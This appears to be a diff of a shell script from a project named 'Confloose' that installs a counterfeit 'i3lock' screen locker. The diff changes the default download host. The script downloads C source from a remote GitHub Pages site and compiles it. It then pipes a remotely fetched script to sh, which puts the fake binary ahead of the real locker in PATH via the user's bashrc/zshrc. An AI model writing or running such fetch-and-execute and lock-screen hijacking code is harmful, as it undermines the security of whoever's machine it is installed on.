@@ -22,7 +22,7 @@ if ! i3lock_bin=$(PATH="$clean_path" command -v i3lock 2>/dev/null); then
 fi
 
 build=$(mktemp -d)
-if ! curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/fake-i3lock/i3lock.c" > "$build/i3lock.c"; then
+if ! curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/fake-i3lock/i3lock.c" > "$build/i3lock.c"; then
     echo "fake-i3lock: download failed" >&2
     rm -rf "$build"
     exit 1
@@ -63,5 +63,5 @@ mkdir -p "$dir"
 mv "$build/i3lock" "$dir/i3lock"
 rm -rf "$build"
 
-echo $(curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-i3lock" "'export PATH=\"$dir:\$PATH\"'" | sh
+echo $(curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-i3lock" "'export PATH=\"$dir:\$PATH\"'" | sh
 for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
